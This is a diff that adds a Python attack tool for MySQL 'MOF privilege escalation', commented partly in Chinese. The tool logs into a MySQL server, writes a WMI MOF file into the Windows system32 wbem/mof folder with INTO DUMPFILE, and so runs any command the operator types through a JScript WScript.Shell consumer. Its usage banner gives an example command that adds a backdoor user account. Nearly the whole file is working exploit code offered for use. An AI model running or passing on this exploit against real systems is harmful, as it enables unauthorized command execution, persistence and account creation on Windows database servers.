@@ -1,0 +1,77 @@
+#-*- coding:utf-8 -*-
+import sys
+import pymysql
+#定义mysql连接信息
+def Usage():
+        print('''
+    ####################################################################
+    #                                                                  #
+    #                  Mysql mof Execute System Command                #
+    #                        Author:Desperado                          #
+    #                                                                  #
+    ####################################################################
+
+    --------------------------------------------------------------------
+    Usage:
+        Host       -->  example:Localhost
+        user           -->  example:root
+        password   -->  example:sbdan
+        port       -->  example:3306
+        Database   -->  example:Mysql
+        Command --> Net user sbdan sbdan /add
+    --------------------------------------------------------------------
+    ''')
+Usage()
+
+def mysqlmof():
+    host = input('Host:')
+    user = input('User:')
+    password = input('Password:')
+    database = input('Database:')
+    port = int(input('Port:'))
+    cmdshell = input('Command:')
+    payload = '''
+    
+    #mof提权内容
+    #pragma namespace(“\\\\.\\root\\subscription”)
+    instance of __EventFilter as \$EventFilter
+    {
+    EventNamespace = \"Root\\\\\\\\Cimv2\";
+    Name  = \"filtP2\";
+    Query = \"Select * From __InstanceModificationEvent \"
+            \"Where TargetInstance Isa \\\\\"Win32_LocalTime\\\\\" \"
+            \"And TargetInstance.Second = 5\";
+    QueryLanguage = \"WQL\";
+    };
+    instance of ActiveScriptEventConsumer as \$Consumer
+    {
+    Name = \"consPCSV2\";
+    ScriptingEngine = \"JScript\";
+    ScriptText = 
+    \"var WSH = new ActiveXObject(\\\\\"WScript.Shell\\\\\")\\\\nWSH.run(\\\\\"%s\\\\\")\";
+    };
+    instance of __FilterToConsumerBinding
+    {
+    Consumer = \$Consumer;
+    Filter = \$EventFilter;
+    };
+    ''' % cmdshell
+    #mysql 连接以及mof提权
+    try:
+        print('Please Wait,Intent To Login')
+        conn = pymysql.connect(host,user,password,database,port)
+        print('Login Successfully')
+    except Exception as e:
+        print(e)
+        
+    try:
+        cursor = conn.cursor()
+        sql = "Select '%s' INTO DUMPFILE 'c:/windows/system32/wbem/mof/nullevt.mof';" % payload
+        cursor.execute(sql)
+        print('Import Mof Successfully')
+        cursor.close
+        sys.exit
+    except Exception as e:
+        print(e)
+        print('Exploit Failed')
+mysqlmof()
